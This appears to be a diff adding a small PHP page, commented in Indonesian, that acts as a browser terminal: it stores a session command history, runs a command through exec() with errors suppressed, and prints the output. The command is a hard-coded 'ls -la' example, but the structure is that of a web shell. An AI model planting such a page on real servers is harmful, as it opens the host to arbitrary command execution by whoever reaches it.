@@ -1,0 +1,37 @@
+<?php
+session_start();
+define('MAX_HISTORY', 10);
+
+if (!isset($_SESSION['cmd_history'])) {
+    $_SESSION['cmd_history'] = [];
+}
+
+// Misal user mengirim perintah
+$cmd = 'ls -la'; // contoh
+if (!empty($cmd)) {
+    // Jika session history sudah mencapai batas
+    if (count($_SESSION['cmd_history']) >= MAX_HISTORY) {
+        array_shift($_SESSION['cmd_history']);
+    }
+    // Masukkan command user ke array
+    $_SESSION['cmd_history'][] = $cmd;
+
+    // Eksekusi
+    $o = [];
+    $r = 0;
+    @exec($cmd, $o, $r);
+    $command_output = ($r === 0) ? implode("\n", $o) : "[ERROR:$r]\n" . implode("\n", $o);
+}
+
+// Tampilkan “Terminal Terpisah”
+echo "<h2>Terminal (Terpisah)</h2>";
+echo "Riwayat perintah:<br>";
+echo "<ul>";
+foreach (array_reverse($_SESSION['cmd_history']) as $h) {
+    echo "<li>" . htmlspecialchars($h) . "</li>";
+}
+echo "</ul>";
+
+// Tampilkan hasil perintah
+echo "<pre>" . htmlspecialchars($command_output ?? '') . "</pre>";
+?>
